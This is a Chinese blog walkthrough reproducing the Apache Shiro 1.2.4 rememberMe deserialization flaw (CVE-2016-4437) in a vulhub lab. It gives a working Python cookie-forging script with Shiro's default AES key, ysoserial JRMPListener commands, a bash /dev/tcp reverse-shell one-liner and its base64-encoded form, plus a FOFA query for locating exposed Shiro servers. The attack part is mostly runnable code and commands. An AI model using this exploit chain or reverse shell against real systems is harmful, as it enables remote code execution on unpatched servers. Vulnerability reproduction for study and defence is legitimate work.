# CVE-2016-4437 Apache Shiro 1.2.4 反序列化漏洞 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15669560.html`](https://www.cnblogs.com/peace-and-romance/p/15669560.html)

### 0X00-引言

* * *

服从让我们撑过白天，而投入才能让我们撑过夜晚。------丹尼尔·平克《驱动力 3.0》

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

工具：ysoserial，burpsuite，LiqunKit

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

fofa 语法：

```
header="rememberme=deleteMe"、header="shiroCookie" 
```

### 0X02-漏洞描述

* * *

Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro 框架直观、易用，同时也能提供健壮的安全性。

Apache Shiro 1.2.4 及以前版本中，加密的用户信息序列化后存储在名为 remember-me 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发 Java 反序列化漏洞，进而在目标机器上执行任意命令。

shiro 默认使用 CookieRememberMeManager，对 rememberMe 的 cookie 做了加密处理，在 CookieRememberMeManaer 类中将 cookie 中 rememberMe 字段内容先后进行序列化、AES 加密、Base64 编码操作。在识别身份的时候，需要对 Cookie 里的 rememberMe 字段解密。根据加密的顺序可以推断出解密的顺序为获取 cookie-base64 解码-AES 解密-反序列化。

AES 加密的 KEY 值被硬编码在代码中，可以从源码中找到 KEY 值。攻击者可以构造恶意代码，将其序列化-AES 加密-base64 编码，最后作为 cookie 值得 rememberMe 字段发送，shiro 将接收到的 rememberMe 字段进行解码-解密-反序列化，如果成功，则执行恶意代码，构成攻击。

影响版本：Apache Shiro <= 1.2.4

### 0X03-工具下载

* * *

##### 01-安装 mvn 命令

```
wget http://mirrors.cnnic.cn/apache/maven/maven-3/3.5.4/binaries/apache-maven-3.5.4-bin.tar.gz  #下载 maven 安装包
tar -zxvf apache-maven-3.5.4-bin.tar.gz  #解压 maven 安装包
mv apache-maven-3.5.4 /usr/local/  #移动到 usr 下 local 目录 
```

配置环境变量，在底部添加如下配置

vim /etc/profile

```
export MAVEN_HOME=/usr/local/apache-maven-3.5.4
export PATH=${PATH}:$MAVEN_HOME/bin 
```

重新加载环境变量

```
source /etc/profile 
```

可能会生成一个新终端，如图，

![image-20211208223936493](img/e328401701213595e7046efc7cbf5641.png)

检查是否安装成功

```
mvn  -v 
```

终端不要关闭，先保持不动

![image-20211208224117588](img/2b492f446a7b31eed37f4c2979562740.png)

##### 02-安装 ysoserial 工具

另起一个新终端

```
mkdir Apacheshiro  #创建新目录
git clone https://github.com/frohoff/ysoserial.git  #下载 ysoserial 
```

![image-20211208224909757](img/87990da4263a258dbd2da8f717abca46.png)

在上一个终端里进入 ysoserial 文件夹

执行以下命令-等待结束

```
mvn package -D skipTests 
```

生成工具

![image-20211208225044977](img/feeee1443abac7d3fb55e0d39ec1538e.png)

##### 03-准备 shiro.py

将 shiro.py 与生成的工具放在同一目录下

shiro.py 源码：

```
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES	#pip install pycryptodome

def encode_rememberme(command):
	popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout = subprocess.PIPE)
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
	iv = uuid.uuid4().bytes
	encryptor = AES.new(key, AES.MODE_CBC, iv)
	file_body = pad(popen.stdout.read())
	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
	return base64_ciphertext

if __name__ == '__main__':
	payload = encode_rememberme(sys.argv[1])
	print("rememberMe={0}".format(payload.decode())) 
```

### 0X04-漏洞复现

`http://192.168.234.128:8080/doLogin`

![image-20211209105146375](img/e908f481e31ac2d59f2c0b3b02fe81b5.png)

##### 01-查看是否存在 shiro 反序列化漏洞

burp 抓包-repeater 发包-看回显-响应头存在 rememberMe 字段-存在 shiro 反序列化漏洞

![image-20211209105619179](img/cfc3b63a35c3adb4bd53e9559a2001ef.png)

##### 02-准备好反弹 shell 的命令

反弹 shell 命令：`bash -i >& /dev/tcp/192.168.234.135/12345 0>&1`

加密网址：[`www.jackson-t.ca/runtime-exec-payloads.html`](https://www.jackson-t.ca/runtime-exec-payloads.html)

加密之后：

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNC4xMzUvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i} 
```

![image-20211209110024754](img/8271e88c3a73e5c769d5b59b20216729.png)

##### 03-kali 执行命令

在生成工具与 shiro.py 所在的目录下执行

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections4 ‘bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNC4xMzUvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i}’ 
```

![image-20211209110431859](img/235b374cad6ea2de62b5e052b595e3f7.png)

注意反弹 shell 命令的单引号。需要在 kali 中重新输入单引号

执行脚本

```
python shiro.py 192.168.234.135:1234#192.168.234.135 为攻击机 IP#1234 为 ysoserial-0.0.6-SNAPSHOT-all.jar 工具监听的端口，与反弹 shell 的命令端口不同，我的工具监听与 nc 反弹 shell 在同一台 kali 机器 
```

生成 poyload

![image-20211209110835217](img/8c0bcf174232f24b413274a2cb648f04.png)

##### 04-反弹 shell

kali 另起已终端，打开 nc 监听

![image-20211209110949708](img/fd363ceb0ed81b4b0cb2ba13ed81e374.png)

burp 抓包-repeater 修改

![image-20211209111216079](img/de43c921e6bee186ef9232e896434249.png)

发送

![image-20211209111308693](img/2a59e86b78dba0b19f5ea0248daee8eb.png)

ysoserial 工具监听到信息-已上传至服务器

![image-20211209111420549](img/06db345eb610c3b7174054afbf1c5281.png)

但是 nc 没有反弹 shell-不知道原因

![image-20211209111456487](img/bc138a6bea547b2595c6ae3f157d7d3a.png)

##### 05-直接进入容器执行反弹 shell 命令

容器内执行发现可以回弹 shell 正常。对比之下我也找不到上面反弹 shell 失败的原因😯

![image-20211209160036228](img/889d088c1c924bafab0c6e842d4f6be6.png)

![image-20211209160100918](img/98306ff55e0dfa76bb565fe3266c08f8.png)

### 0X05-工具利用

* * *

工具地址：[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

##### 01-反弹 shell

![image-20211209154638476](img/7d0691ff134b780233e78b5d19214303.png)

![image-20211209154821080](img/d493b64d9c9ef5abfd140ead1be6b3bf.png)

成功

![image-20211209154855091](img/1fbc4adb8458f8a6071668513cd0ca92.png)

还是工具好用，手动复现半天，工具一分钟反弹 shell，淦😂

### 0X06-参考

* * *

[Apache Shiro 反序列化漏洞复现并利用（CVE-2016-4437）](https://blog.csdn.net/qq_42773814/article/details/112393359)

[Apache Shiro 反序列化(CVE-2016-4437)复现](https://blog.csdn.net/m0_48520508/article/details/107770264?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.highlightwordscore&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.highlightwordscore)

[linux 安装 maven 、解决：bash: mvn: command not found](https://www.cnblogs.com/yuexiaoyun/articles/13033946.html)

[Apache Shiro 1.2.4 反序列化漏洞（CVE-2016-4437）复现](https://www.cnblogs.com/panisme/p/12552838.html)

[(CVE-2016-4437) Apache Shiro 反序列化漏洞 复现](https://www.jianshu.com/p/cac9a7f2b3af)

[shiro 反序列化复现(续） ---利用 docker-vulhub 搭建复现（为了打出 shell，针对 linux 系统）](https://www.cnblogs.com/hcrk/p/13501200.html)